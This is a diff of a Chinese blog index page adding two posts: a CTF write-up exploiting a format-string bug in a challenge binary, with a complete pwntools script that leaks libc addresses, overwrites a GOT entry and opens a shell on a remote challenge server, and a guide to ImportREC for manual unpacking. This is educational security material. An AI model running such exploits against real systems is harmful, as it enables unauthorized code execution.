+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a><strong>格式化字符串漏洞利用</strong></h3><p>以<strong>实验吧 printf</strong>为例：<br><strong>漏洞利用思路</strong>：</p>
+<ol>
+<li>注意到在get_file中存在格式化字符串漏洞，利用其泄露出真实的puts地址，从而计算得到真实的system地址</li>
+<li>将puts的got表覆盖成真实的system地址，并将其参数布局成 ‘/bin/sh’</li>
+<li>在dir_file功能中调用puts(“/bin/sh”)时，相当于调用了system(“/bin/sh”)<br><img src="/2019/09/10/格式化字符串漏洞利用/19a4a1a3fbdeaebe9be40c9bb7048e88.png" alt><br><img src="/2019/09/10/格式化字符串漏洞利用/79076a875c0be0f6d97d4c473253830b.png" alt><br>使用<strong>objdump</strong>得到想要的信息：<br>拿到<strong>puts的got表地址</strong>：<br><img src="/2019/09/10/格式化字符串漏洞利用/12f365ca9d4c0974c5c199fc01c77ad1.png" alt><br>拿到他们<strong>在libc中的偏移</strong>：<br><img src="/2019/09/10/格式化字符串漏洞利用/3b2274e6c5035e053d8ae71843504655.png" alt><br>找见<strong>可控字段</strong>：<br><img src="/2019/09/10/格式化字符串漏洞利用/3e106ca9b4c77a52be5e124bc8b9a7b2.png" alt></li>
+</ol>
+<p><strong>偏移量</strong>为：(0xd24c-0xd230)/4 = 7<br>利用printf打印出puts的got表中对应的真实的puts地址，使用其计算得到真实的system地址</p>
+<p><strong>计算方法</strong>如下：<br>addr_libc = addr_puts - offset_puts<br>addr_system = addr_libc + offset_system<br>利用%n覆写puts的got表地址，拿到shell</p>
+<p><strong>exp</strong>如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">puts_file</span><span class="params">(io,  name,content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'ftp&gt;'</span>)</span><br><span class="line">    io.sendline(<span class="string">'put'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'upload:'</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">get_file</span><span class="params">(io,  name)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'ftp&gt;'</span>)</span><br><span class="line">    io.sendline(<span class="string">'get'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'get:'</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">dir_file</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'ftp&gt;'</span>)</span><br><span class="line">    io.sendline(<span class="string">'dir'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'Start!'</span></span><br><span class="line">    fake_username  =  <span class="string">'sysbdmin'</span></span><br><span class="line">    real_username  =  <span class="string">''</span></span><br><span class="line">    <span class="comment">#计算出真实的用户名</span></span><br><span class="line">    <span class="keyword">for</span>  i  <span class="keyword">in</span>  fake_username:</span><br><span class="line">        real_username  +=  chr(ord(i)  -  <span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Name (ftp.hacker.server:Rainism):'</span>)</span><br><span class="line">    io.sendline(real_username)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] real_username : '</span>,real_username</span><br><span class="line">    <span class="comment">#得到puts的got表地址</span></span><br><span class="line">    got_puts  =  <span class="number">0x0804a028</span></span><br><span class="line">    <span class="comment">#得到puts的偏移量</span></span><br><span class="line">    offset_puts  =  <span class="number">0x5fca0</span></span><br><span class="line">    content  =  p32(got_puts)  +  <span class="string">'%7$s...'</span></span><br><span class="line">    <span class="comment">#构造之后system调用的参数("/bin/sh")</span></span><br><span class="line">    name  =  <span class="string">'/sh'</span></span><br><span class="line">    puts_file(io,  name,  content)</span><br><span class="line">    get_file(io,  name)</span><br><span class="line">    <span class="comment">#利用printf的格式化字符串漏洞打印出真实的puts地址</span></span><br><span class="line">    data  =  io.recvuntil(<span class="string">'...'</span>)[<span class="number">0</span>:]</span><br><span class="line">    addr_puts  =  u32(data[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] addr_puts: '</span>,hex(addr_puts)</span><br><span class="line">    <span class="comment">#计算libc的基址</span></span><br><span class="line">    addr_libc  =  addr_puts  -  offset_puts</span><br><span class="line">    offset_system  =  <span class="number">0x3ada0</span></span><br><span class="line">    <span class="comment">#计算system的真实地址</span></span><br><span class="line">    addr_system  =  addr_libc  +  offset_system</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] addr_system: '</span>,hex(addr_system)</span><br><span class="line"></span><br><span class="line">    addr_info  =  <span class="string">''</span></span><br><span class="line">    padding_info  =  <span class="string">''</span></span><br><span class="line">    <span class="comment">#覆盖puts的got表地址</span></span><br><span class="line">    system_addr_buff  =  p32(addr_system)</span><br><span class="line">    begin_index  =  <span class="number">7</span></span><br><span class="line">    offset  =  <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span>  i  <span class="keyword">in</span>  range(<span class="number">4</span>):</span><br><span class="line">        addr_info  +=  p32(got_puts  +  i)</span><br><span class="line">        val  =  ord(system_addr_buff[i])</span><br><span class="line">        count  =  val  -  offset</span><br><span class="line">        <span class="keyword">if</span>  count  &lt;  <span class="number">0</span>  :</span><br><span class="line">            count  +=  <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">        padding_info  +=  <span class="string">'%%%dc'</span>  %  count  +  <span class="string">'%%%d$hhn'</span>  %  (begin_index  +  i)</span><br><span class="line"></span><br><span class="line">        offset  =  val</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] Start Attacking!'</span></span><br><span class="line">    <span class="comment">#与之前创建的文件名组成了system的参数("/bin/sh")</span></span><br><span class="line">    name  =  <span class="string">'/bin'</span></span><br><span class="line">    content  =  addr_info  +  padding_info</span><br><span class="line">    puts_file(io,  name,  content)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] puts_file succeed!'</span></span><br><span class="line">    get_file(io,  name)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] get_file succeed!'</span></span><br><span class="line">    dir_file(io)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] dir_file succeed!'</span></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    io  =  remote(<span class="string">'106.2.25.7'</span>,<span class="number">8001</span>)</span><br><span class="line">    pwn(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  __name__  ==  <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p><strong>运行结果</strong>如下：<br><img src="/2019/09/10/格式化字符串漏洞利用/1f07ab3fcea14d0a0bd825f8e810efb4.png" alt></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">pwn,格式化字符串</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/格式化字符串漏洞利用/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-输入表重建工具ImportREC" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/10/输入表重建工具ImportREC/">输入表重建工具ImportREC</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/10/输入表重建工具ImportREC/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="输入表重建工具ImportREC"><a href="#输入表重建工具ImportREC" class="headerlink" title="输入表重建工具ImportREC"></a>输入表重建工具ImportREC</h3><p>　　  Import REConstructor可以从杂乱的IAT中重建一个新的Import表（例如加壳软件等），它可以重建Import表的描述符、IAT和所有的ASCII函数名。用它配合手动脱壳，可以脱UPX、CDilla1、PECompact、PKLite32、Shrinker、ASPack, ASProtect等壳。该工具位于：光盘\tools\PE tools\Rebuilders\Import REConstructor。</p>
+<p><strong>在运行Import REConstructor之前，必须满足如下条件</strong>：<br>1） 目标文件己完全被Dump到另一文件；<br>2） 目标文件必须正在运行中；<br>3） 事先要找到真正的入口点（OEP）；<br>4） 最好加载IceDump，这样建立的输入表较少存在跨平台的问题。<br><strong>步骤如下</strong>：<br>（1）找被脱壳的入口点（OEP）；<br>（2）完全Dump目标文件；<br>（3）运行Import REConstructor和需要脱壳的应用程序；<br>（4）在Import REConstructor下拉列表框中选择应用程序进程；<br>（5）在左下角填上应用程序的真正入口点偏移（OEP）；</p>
+<p>（6）按”IAT AutoSearch”按钮，让其自动检测IAT位置， 出现”Found address which may be in the Original IAT.Try ‘Get Import’”对话框，这表示输入的OEP发挥作用了。</p>
+<p>（7）按”Get Import”按钮，让其分析IAT结构得到基本信息；</p>
+<p>（8）如发现某个DLL显示”valid :NO” ，按”Show Invalids”按钮将分析所有的无效信息，在Imported Function Found栏中点击鼠标右键，选择”Trace Level1 (Disasm)”，再按”Show Invalids”按钮。如果成功，可以看到所有的DLL都为”valid:YES”字样；</p>
+<p>（9）再次刷新”Show Invalids”按钮查看结果，如仍有无效的地址，继续手动用右键的Level 2或3修复；</p>
+<p>（10）如还是出错，可以利用”Invalidate function(s)”、”Delete thunk(s)”、编辑Import表（双击函数）等功能手动修复。</p>
+<p>（11）开始修复已脱壳的程序。选择Add new section (缺省是选上的) 来为Dump出来的文件加一个Section(虽然文件比较大，但避免了许多不必要的麻烦) 。</p>
+<p>（12）按”Fix Dump”按钮，并选择刚在（2）步Dump出来的文件，在此不必要备份。如修复的文件名是”Dump.exe”，它将创建一个”Dump_.exe”，此外OEP也被修正。</p>
+<p>（13）生成的文件可以跨平台运行。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">re</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/输入表重建工具ImportREC/">展开全文 >></a>
         </p>
       
 
@@ -719,6 +828,38 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">pwn,格式化字符串</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">git</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">pwn,栈,溢出</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">pwn,python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">pwn,ROP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">pwn,ROP,ret2dlresolve</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">re</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
